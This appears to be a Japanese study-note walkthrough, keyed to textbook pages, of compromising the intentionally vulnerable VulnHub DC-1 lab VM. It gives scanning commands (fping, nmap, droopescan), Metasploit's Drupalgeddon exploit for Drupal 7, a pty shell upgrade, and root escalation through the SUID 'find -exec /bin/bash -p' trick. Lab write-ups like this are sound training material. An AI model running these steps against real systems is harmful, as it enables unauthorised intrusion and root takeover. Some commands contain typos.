# EXPERIMENT #02 DC-1 のハッキング(P410)

## ハッキングの準備

- [DC-1](https://www.vulnhub.com/entry/dc-1,292)
- 難易度: 初級

## [実習] DC-1 マシンをハッキングする＜攻略＞

### 1. DC-1 マシンを起動する(p410)

```sh
$ export VM_NAME = VMの名前
$ VBoxManage startvm $VM_NAME  --type headless
```

### 2. ParrotOS マシンを起動する(p411)

Parrot マシンを起動してください

### 3. ParrotOS マシンの IP アドレスを調べる(p411)

現在のコマンドは`ip a` 以前は `ifconfig`コマンドを使用した
Web サイトや古い本には ifconfig で説明されていることが多いので各自置き換えること
また現在でも net-tools パッケージを入れると使用することができる

### 4. DC-1 マシンの IP アドレスを特定する(p411)

IP アドレスをスキャンするツールは netdiscover や nmap 等，色々あるがここでは fping を使用する
どのツールで man をみれば使えるようにしておきたい

```sh
parrot01$ fping -qag 192.168.56.0/24
```

### 5. IP アドレスを環境変数に設定する(p412)

よく使うものは変数にすると良い

```sh
parrot01$ export IP=IPアドレス
```

### 6. ポートスキャンする(p412)

```sh
parrot01$ nmap -sC -sV -p 1-65535 $IP
```

- sC デフォルトスキャン
- sV ソフトウェア名とヴァージョン
- p スキャンするポートを指定 -p- ですべて

このパターンのスキャンはよく使うのでエイリアス化しておく
Ubuntu では，.bash_aliases に記述しておくと良い

```sh
parrot01$ alias defaultscan='nmap -sC -sV -p- '
parrot01$ defaultscan $IP
```

### 7. HTTP サービスにアクセスする(p414)

```sh
parrot01$ curl -v http://$IP
```

### 8. よく使われる”robots.txt” ファイルにアクセスする(p414)

robots. txt ファイルとは、検索エンジンのクローラーに対して、サイトのどの URL にアクセスしてよいかを伝えるものである
それをみることによって，どのようなファイルやディレクトリがあるかを知ることができる。
ここでは MAINTAINERS.txt を覗くことによって CMS の情報を取る

```sh
parrot01$ curl -v http://$IP/robots.txt
> MAINTAINERS.txt

parrot01$ curl -v http://$IP/MAINTAINERS.txt
> ...Dropal 7
```

### 9. URL を環境変数に設定する(p416)

```sh
parrot01$ export URL="http://$IP:80/"
parrot01$ echo $URL # 確認用
```

### 10. Web サーヴィスでスキャンする(p417)

```sh
parrot01$ droopscan --help
> インストールされていない

parrot01$ mkdir ~/venv
parrot01$ python3 -m venv ~/venv/dc1
parrot01$ source ~/venv/dc1/bin/activate
parrot01$ pip install droopscan
parrot01$ droopscan --help # 確認

parrot01$ scan droopescan drupal -u $URL
> scan 結果
```

### 11. Drupal 用の Exploit を探す(p420)

Drupal の ヴァージョン 7 の Remote 用の exploit を検索

[Exploit Database](https://www.exploit-db.com)

### 12. Metasploit で Drupalgeddon を狙う(p422)

```sh
parrot01$ msfconsole
> search type:exploit drupal # Drupal用のexploitを検索
> use exploit/multi/http/drupal_drupageddon
>> show options ## オプション確認
>> set RHOSTS [ターゲット端末のIP]
>> set LHOSTS [攻撃用端末のIP]
>> show options ## 正しく設定されているか確認
```

### 13. Exploit モジュールの実行(p427)

```sh
parrot01$
>> run
(/var/www) > ls
> flag1.txt
(/var/www) > cat flag.txt
> Every good CMS needs a config file - and so do you.
```

### 14. Meterpreter セッションからシェルに切り替える(p428)

```sh
parrot01$
(/var/www) > shell
id

```

### 15. 対話的シェルを奪取する(p429)

```sh
which python
> /usr/bin/python
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@DC-1:/var/www $ # prompt
```

### 16. OS を特定する(p431)

```sh
www-data@DC-1:/var/www $ uname -a
```

### 17. システム内を探索する(p431)

```sh
www-data@DC-1:/var/www $ ls  /home
> flag4

www-data@DC-1:/var/www $ cd /home/flag4
www-data@DC-1:/home/flag4 $ ll
> flag4.txt

www-data@DC-1:/home/flag4 $ cat flag4.txt
> Can you ....

www-data@DC-1:/home/flag4 $ cat .bash_history
> Permission denied
```

### 18. 一時ファイルの置き場所を調べる

```sh
www-data@DC-1:/home/flag4 $ ll /tmp
www-data@DC-1:/home/flag4 $ la /dev/shm
>  .tmpfs
www-data@DC-1:/home/flag4 $ file /dev/shm/.tmpfs
www-data@DC-1:/home/flag4 $ df -h
```

### 19. SUID ファイルを検索

```sh
www-data@DC-1:/home/flag4 $ find / -perm -u=s -type f 2> /dev/null
> /usr/bin/find
> /usr/sbin/exim4
```

### 20. find コマンドを利用してシェルを奪う(p435)

[GTFOBins](https://gtfobins.github.io)

```sh
www-data@DC-1:/home/flag4 $ /usr/bin/find . -exec /bin/bash -p \; -quit
bash # id
> groups=0(root)
bash # whoami
> root
```

### 21. フラグファイルを開く(p437)

```sh
bash # ls /root
> thefinalflag.txt
bash # cat thefinalflag.txt
```
